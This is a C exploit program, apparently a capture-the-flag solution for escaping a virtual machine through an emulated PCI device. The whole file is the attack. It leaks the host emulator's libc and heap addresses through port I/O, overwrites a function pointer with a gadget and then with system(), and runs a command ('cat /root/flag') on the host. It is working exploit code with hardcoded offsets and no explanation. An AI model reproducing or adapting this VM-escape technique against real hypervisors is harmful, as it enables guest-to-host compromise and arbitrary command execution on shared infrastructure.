#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/io.h>

#define PIO_BASE 0xc050

int fd, mmio_fd;
void *mmio_mem;

int init_mmio() {

    mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd < 0) {
        perror("open pci");
        return -1;
    }

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem < 0) {
        perror("mmap mmio_mem");
        return -1;
    }
    printf("mmio_mem: 0x%x\n", (size_t) mmio_mem);

    return 0;
}

uint64_t mmio_read(uint64_t addr) {
    return *(uint64_t *)((uint8_t *) mmio_mem + addr);
}

void mmio_write(uint64_t addr, uint64_t val) {
    *(uint64_t *)((uint8_t *) mmio_mem + addr) = val;
}

uint64_t pio_read(uint64_t addr) {
    outl(addr << 2, PIO_BASE + 0x0);
    return inl(PIO_BASE + 0x4);
}

void pio_write(uint64_t addr, uint64_t val) {
    outl(addr << 2, PIO_BASE + 0x0);
    outl(val, PIO_BASE + 0x4);
}

int main() {
    int r = 0;
    void *userbuf;
    uint64_t phy_userbuf;

    fd = open("/proc/self/pagemap", O_RDONLY);
    if (!fd) {
        perror("open pagemap");
        return -1;
    }

    /* init PIO */
    r = iopl(3);
    if (r < 0) {
        perror("ioperm");
        return -1;
    }

    /* init MMIO */
    r = init_mmio();
    if (r == -1) {
        perror("init mmio");
        return -1;
    }

    /* leak libc & heap */
    uint32_t arr[2];
    uint64_t srand_addr;
    arr[0] = pio_read(0x41);
    arr[1] = pio_read(0x42);
    srand_addr = *((uint64_t *) arr);
    printf("srand_addr: 0x%llx\n", srand_addr);
    uint64_t libc_base = srand_addr - 0x475c0;
    printf("libc_base: 0x%llx\n", libc_base);
    uint64_t system_addr = libc_base + 0x52290;
    printf("system_addr: 0x%llx\n", system_addr);
    uint64_t heap_base;
    arr[0] = pio_read(0x4f);
    arr[1] = pio_read(0x50);
    heap_base = *((uint64_t *) arr) - 0x16ee00;
    printf("heap_base: 0x%llx\n", heap_base);
    uint64_t state_addr = heap_base + 0x17d7e0;
    printf("state_addr: 0x%llx\n", state_addr);

    /* bypass rand_r when idx==3 */
    uint32_t *ptr;
    uint64_t gadget = libc_base + 0x00000000000de294; // 0x00000000000de294 : mov rax, qword ptr [rdi + 0x20] ; ret
    printf("gadget: 0x%llx\n", gadget);
    ptr = (uint32_t *) &gadget;
    for (int i = 0; i < 2; i++) {
        pio_write(0x45 + i, *(ptr + i)); /* rand_r => atoll */
    }
    uint32_t cmd[] = {0x20746163, 0x6f6f722f, 0x6c662f74, 0x6761}; // char cmd[] = "cat /root/flag";
    pio_write(0x2 + 0x20 >> 2, 0x6f6f722f);
    pio_write(0x3, 0xdeadbeef); /* call gadget */

    /* write command */
    for (int i = 0; i < 4; i++) {
        if (i == 3) {
            continue;
        } else {
            pio_write(0x2 + i, cmd[i]);
        }
    }
    uint64_t cmd_addr = heap_base + 0x17e2dc;
    printf("cmd_addr: 0x%llx\n", cmd_addr);

    /* overrwite ptr */
    ptr = (uint32_t *) &system_addr;
    for (int i = 0; i < 2; i++) {
        pio_write(0x45 + i, *(ptr + i)); /* rand_r => system */
    }

    /* trigger func */
    outl(3 << 2, PIO_BASE + 0x0); /* set idx */
    outl(0xdeadbeef, PIO_BASE + 0x4); /* call system */

    close(fd);
    close(mmio_fd);

    return 0;
}
